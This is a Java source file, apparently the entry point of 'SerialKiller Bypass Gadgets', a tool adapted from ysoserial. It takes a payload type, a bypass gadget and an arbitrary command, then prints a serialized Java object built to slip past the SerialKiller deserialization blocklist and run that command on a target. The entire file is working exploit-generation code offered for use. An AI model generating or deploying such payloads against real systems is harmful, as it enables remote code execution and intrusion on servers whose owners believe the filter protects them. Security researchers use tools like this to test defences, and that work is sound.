package serialkiller;

import serialkiller.bypass.*;
import ysoserial.GeneratePayload;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;

import java.io.PrintStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

/**
 * Created by alvaro on 08/04/16.
 * Basically taken from YSOSerial: https://raw.githubusercontent.com/frohoff/ysoserial/master/src/main/java/ysoserial/GeneratePayload.java
 */
public class Main {

    public static void main (String[] args) {

        if (args.length != 3) {
            printUsage();
            System.exit(-1);
        }
        final String payloadType = args[0];
        final String bypassType = args[1];
        final String command = args[2];

        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        final Class<? extends BypassGadget> bypassClass = getBypassClass(bypassType);

        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            printUsage();
            System.exit(-1);
            return; // make null analysis happy
        }

        if (bypassClass == null) {
            System.err.println("Invalid bypass type '" + bypassType + "'");
            printUsage();
            System.exit(-1);
            return; // make null analysis happy
        }

        try {
            final BypassGadget bypass = bypassClass.newInstance();
            final ObjectPayload payload = payloadClass.newInstance();
            Object wrapped_payload = bypass.wrapPayload(command, payloadClass);

            PrintStream out = System.out;
            Serializer.serialize(wrapped_payload, out);
            ObjectPayload.Utils.releasePayload(payload, wrapped_payload);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(-1);
        }
        System.exit(0);
    }

    private static void printUsage() {
        System.err.println("SerialKiller Bypass Gadgets");
        System.err.println("Usage: java -jar serialkiller-bypass-gadgets-[version]-all.jar [payload type] [bypass type] '[command to execute]'");
        System.err.println("\tAvailable payload types:");

        final List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new GeneratePayload.ToStringComparator()); // alphabetize
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            System.err.println("\t\t" + payloadClass.getSimpleName() + " " + Arrays.asList(Dependencies.Utils.getDependencies(payloadClass)));
        }

        System.err.println("\n\tAvailable bypass types:");
        final List<Class<? extends BypassGadget>> bypassClasses = new ArrayList<Class<? extends BypassGadget>>(BypassGadget.getBypassGadgets());
        Collections.sort(bypassClasses, new GeneratePayload.ToStringComparator()); // alphabetize
        for (Class<? extends BypassGadget> bypassClass : bypassClasses) {
            System.err.println("\t\t" + bypassClass.getSimpleName() + " " + Arrays.asList(Dependencies.Utils.getDependencies(bypassClass)));
        }

    }

    public static Class getBypassClass(String className) {
        Class clazz = null;
        try {
            clazz = Class.forName(className);
        } catch (Exception localException) {}
        if (clazz == null) {
            try {
                return clazz = Class.forName(Main.class.getPackage().getName() + ".bypass." + className);
            } catch (Exception localException1) {}
        }
        if ((clazz != null) && (!BypassGadget.class.isAssignableFrom(clazz))) {
            clazz = null;
        }
        return clazz;
    }


}
